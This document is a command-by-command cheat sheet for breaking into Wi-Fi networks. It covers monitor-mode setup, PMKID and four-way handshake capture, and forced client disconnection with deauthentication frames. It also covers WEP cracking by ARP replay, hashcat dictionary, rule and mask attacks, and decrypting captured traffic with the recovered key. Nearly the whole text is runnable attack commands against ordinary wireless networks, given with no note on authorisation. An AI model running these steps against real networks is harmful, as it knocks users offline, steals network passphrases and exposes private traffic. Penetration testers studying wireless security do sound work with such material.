# WPA Attacks — PMKID, Handshake, Hashcat Handoff

---

## Adapter setup

```bash
# Verify monitor mode capability
iw list | grep -A10 "Supported interface modes"   # must include "monitor"
iw list | grep -A5 "Supported commands"           # must include "set-channel"

# Enable monitor mode
sudo airmon-ng check kill       # kill interfering processes
sudo airmon-ng start wlan0      # creates wlan0mon

# Verify
iw dev wlan0mon info | grep type   # should show "monitor"

# Set channel manually (when needed)
sudo iwconfig wlan0mon channel 6
sudo iw wlan0mon set channel 6 HT20
```

---

## Target survey

```bash
# Quick survey — all channels
sudo airodump-ng wlan0mon

# Dual-band
sudo airodump-ng --band abg wlan0mon

# Output columns:
# BSSID | PWR | Beacons | Data | CH | MB | ENC | CIPHER | AUTH | ESSID
# ENC: WPA2, WPA3, WEP, OPN
# AUTH: PSK (personal), MGT (enterprise/RADIUS), SAE (WPA3)
# CIPHER: CCMP (AES), TKIP
```

---

## PMKID attack (no client needed)

PMKID = HMAC-SHA1(PMK, "PMK Name" + AP_MAC + Client_MAC). Computed from first EAPOL frame.

```bash
# Capture PMKID
sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=3

# Target specific AP
echo "AA:BB:CC:DD:EE:FF" > target_bssid.txt   # no colons in some versions
sudo hcxdumptool -i wlan0mon -o capture.pcapng \
  --filterlist_ap=target_bssid.txt --filtermode=2 --enable_status=3

# Convert for hashcat
hcxpcapngtool -o pmkid_hash.txt capture.pcapng
# Or for specific format:
hcxpcapngtool -E essidlist -I ignorelist -U usernamelist -o hash22000.txt capture.pcapng

# Verify captured
hcxpcapngtool capture.pcapng | grep PMKID

# Crack (mode 22000 — combined WPA/PMKID)
hashcat -m 22000 pmkid_hash.txt /path/to/rockyou.txt
hashcat -m 22000 pmkid_hash.txt /path/to/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 22000 pmkid_hash.txt -a 3 "?l?l?l?l?l?l?l?l"   # mask attack 8 lowercase
```

---

## Four-way handshake capture

```bash
# Step 1: Target specific AP on its channel
sudo airodump-ng -c <channel> --bssid <AP_MAC> wlan0mon -w handshake --output-format cap

# Step 2: Wait for client auth, OR force with deauth
# Targeted deauth (quieter — specific client)
sudo aireplay-ng -0 3 -a <AP_MAC> -c <client_MAC> wlan0mon

# Broadcast deauth (noisier — all clients)
sudo aireplay-ng -0 5 -a <AP_MAC> wlan0mon

# Wait for "WPA handshake: <AP_MAC>" message in airodump output

# Step 3: Verify handshake
aircrack-ng handshake*.cap   # shows "1 handshake" or eapol/anonce counts

# Step 4: Convert for hashcat
hcxpcapngtool -o hash22000.txt handshake*.cap

# Crack
hashcat -m 22000 hash22000.txt rockyou.txt
hashcat -m 22000 hash22000.txt rockyou.txt -r rules/best64.rule
```

---

## Legacy format (mode 2500) — older captures

```bash
# If capture is legacy format / older hashcat:
# Convert with cap2hashcat or:
hcxpcapngtool --legacy-pmkid -o hash2500.txt capture.cap
hashcat -m 2500 hash2500.txt rockyou.txt
```

---

## WEP cracking (legacy — rare)

```bash
# Capture IVs (need large number: 50k-500k)
sudo airodump-ng -c <ch> --bssid <AP_MAC> wlan0mon -w wep_capture

# Accelerate with ARP replay injection
sudo aireplay-ng -3 -b <AP_MAC> -h <client_MAC> wlan0mon

# Crack when enough IVs accumulated
aircrack-ng wep_capture*.cap
```

---

## Hashcat cracking strategy

```bash
# 1. Dictionary first (fastest)
hashcat -m 22000 hash.txt rockyou.txt

# 2. Dictionary + rules
hashcat -m 22000 hash.txt rockyou.txt -r rules/best64.rule
hashcat -m 22000 hash.txt rockyou.txt -r rules/d3ad0ne.rule

# 3. Target-specific wordlist (SSID-based)
# Wi-Fi passwords often: SSIDname + year, SSIDname123!, street address
echo "TargetSSID2023" > custom_words.txt
echo "TargetSSID2024!" >> custom_words.txt
hashcat -m 22000 hash.txt custom_words.txt

# 4. Mask attack — 8-digit numbers (ISP defaults)
hashcat -m 22000 hash.txt -a 3 "?d?d?d?d?d?d?d?d"

# 5. Keyboard walks (common for router defaults)
hashcat -m 22000 hash.txt -a 3 "?l?l?l?l?l?l?l?l" --increment --increment-min=8

# 6. PRINCE attack (combinatorial)
hashcat -m 22000 hash.txt -a 6 rockyou.txt "?d?d?d?d"  # word + 4 digits

# See cracking-technique for full strategy selection
```

---

## Wireshark handshake validation

```bash
# Filter for EAPOL (WPA handshake) frames
# Wireshark filter: eapol
# Need: Message 1 + 2, or 2 + 3 (any two consecutive)

# Decrypt WPA traffic in Wireshark after cracking:
# Edit → Preferences → Protocols → IEEE 802.11
# Add decryption key: wpa-pwd:<PSK>:<SSID>

# Or via tshark
tshark -r capture.cap -o "wlan.enable_decryption:TRUE" \
  -o "uat:80211_keys:\"wpa-pwd\",\"<PSK>:<SSID>\""
```
